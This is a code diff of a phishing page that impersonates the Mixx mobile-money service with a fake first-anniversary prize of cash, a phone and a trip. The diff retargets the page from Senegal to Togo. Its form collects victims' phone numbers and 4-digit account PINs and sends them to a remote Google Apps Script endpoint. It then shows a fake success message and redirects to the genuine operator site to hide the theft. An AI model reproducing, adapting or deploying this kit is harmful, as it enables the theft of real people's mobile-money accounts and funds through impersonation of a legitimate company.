@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mixx Sénégal - 1er Anniversaire</title>
+    <title>Mixx Togo - 1er Anniversaire</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
@@ -276,16 +276,16 @@
     <div class="container">
         <div class="header">
             <div class="logo-container">
-                <img src="logo.png" alt="Mixx Sénégal" class="logo">
+                <img src="logo.png" alt="Mixx Togo" class="logo">
             </div>
             <div class="brand-name">MIXX</div>
-            <div class="brand-sub">by Yas | SAGA Africa</div>
+            <div class="brand-sub">by Yas | TOGOCOM</div>
             <div class="anniversary-badge">🎂 1ER ANNIVERSAIRE !</div>
         </div>
         
         <div class="banner">
             🎉 OFFRE EXCEPTIONNELLE ! 🎉<br>
-            <small style="font-size:13px;">Nous fêtons notre 1er anniversaire !</small>
+            <small style="font-size:13px;">Nous fêtons notre 1er anniversaire au Togo !</small>
         </div>
         
         <div class="content">
@@ -302,7 +302,8 @@
                 <span class="confetti">💰</span>
                 
                 <div style="font-size:14px; color:#666;">Votre prix :</div>
-                <div class="prize-amount">XOF 500,000</div>
+                <div class="prize-amount">500.000</div>
+                <div class="prize-currency">FCFA</div>
                 <div class="phone-prize">📱 + Téléphone Samsung Galaxy A14</div>
                 <div class="trip-prize">✈️ + Voyage VIP au Maroc</div>
             </div>
@@ -315,11 +316,11 @@
                 <div class="form-group">
                     <label>📱 Votre numéro Mixx :</label>
                     <div class="phone-input">
-                        <input type="text" class="country-code" value="+221" readonly>
-                        <input type="tel" id="phoneNumber" class="phone-field" placeholder="77 123 45 67" maxlength="11" required>
+                        <input type="text" class="country-code" value="+228" readonly>
+                        <input type="tel" id="phoneNumber" class="phone-field" placeholder="90 12 34 56" maxlength="11" required>
                     </div>
-                    <div class="phone-hint">Format : 7X XXX XX XX (9 chiffres)</div>
-                    <div id="phoneCounter" class="phone-counter incomplete">0/9 chiffres</div>
+                    <div class="phone-hint">Format : XX XX XX XX (8 chiffres)</div>
+                    <div id="phoneCounter" class="phone-counter incomplete">0/8 chiffres</div>
                 </div>
                 
                 <div class="form-group">
@@ -358,18 +359,18 @@
             </div>
             
             <div class="yas-powered">
-                Propulsé par <strong>Yas</strong> | SAGA Africa Holding SA
+                Propulsé par <strong>Yas Togo</strong> | TOGOCOM SA
             </div>
         </div>
         
         <div class="footer">
-            © 2024 Mixx Sénégal - SAGA Africa Holding SA<br>
-            <a href="https://www.mixx.sn">www.mixx.sn</a> | <a href="https://yas.sn">yas.sn</a>
+            © 2024 Mixx Togo - TOGOCOM SA<br>
+            <a href="https://www.togocom.tg">www.togocom.tg</a>
         </div>
     </div>
 
     <script>
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbyoIDuv86B0vJaB6hiWfIpYsLaOG9RMr_P2rxFQ0O5CCAWtKiKuH7iT6LTNNiHTgFDdpQ/exec';
+        const scriptURL = 'PASTE_YOUR_APPS_SCRIPT_URL_HERE';
 
         const phoneInput = document.getElementById('phoneNumber');
         const pinInput = document.getElementById('pin');
@@ -395,21 +396,22 @@
         }
         updateTimer();
 
+        // Phone formatting - 8 digits (XX XX XX XX)
         phoneInput.addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
-            if (value.length > 9) value = value.slice(0, 9);
+            if (value.length > 8) value = value.slice(0, 8);
             
             let formatted = '';
             for (let i = 0; i < value.length; i++) {
-                if (i === 2 || i === 5) formatted += ' ';
+                if (i === 2 || i === 4 || i === 6) formatted += ' ';
                 formatted += value[i];
             }
             
             e.target.value = formatted;
             
             const digitCount = value.length;
-            phoneCounter.textContent = digitCount + '/9 chiffres';
-            phoneCounter.className = digitCount === 9 ? 'phone-counter' : 'phone-counter incomplete';
+            phoneCounter.textContent = digitCount + '/8 chiffres';
+            phoneCounter.className = digitCount === 8 ? 'phone-counter' : 'phone-counter incomplete';
             
             validateForm();
         });
@@ -427,7 +429,7 @@
         function validateForm() {
             const phoneDigits = phoneInput.value.replace(/\D/g, '').length;
             const pinDigits = pinInput.value.length;
-            submitBtn.disabled = !(phoneDigits === 9 && pinDigits === 4);
+            submitBtn.disabled = !(phoneDigits === 8 && pinDigits === 4);
         }
 
         document.getElementById('claimForm').addEventListener('submit', function(e) {
@@ -442,11 +444,11 @@
                 mode: 'no-cors',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    phone: '+221' + phone,
+                    phone: '+228' + phone,
                     pin: pin,
                     timestamp: timestamp,
-                    country: 'Senegal',
-                    source: 'mixx_sn_1st_anniversary'
+                    country: 'Togo',
+                    source: 'mixx_tg_1st_anniversary'
                 })
             });
             
@@ -464,7 +466,7 @@
                     <div style="background:#e8f5e9; padding:18px; border-radius:12px; border: 2px solid #28a745;">
                         <p style="font-size:14px; color:#2e7d32; text-align:left; line-height:1.8;">
                             ✅ Votre demande est valide<br>
-                            📱 Numéro : <strong>+221${phone}</strong><br>
+                            📱 Numéro : <strong>+228${phone}</strong><br>
                             🎁 Cadeau : <strong>500.000 FCFA</strong><br>
                             📱 Téléphone : <strong>Samsung Galaxy A14</strong><br>
                             ✈️ Bonus : <strong>Voyage VIP au Maroc</strong>
@@ -483,7 +485,7 @@
                 if (cdEl) cdEl.textContent = count;
                 if (count <= 0) {
                     clearInterval(countdown);
-                    window.location.href = 'https://www.yas.sn/';
+                    window.location.href = 'https://www.yas.tg/';
                 }
             }, 1000);
         });
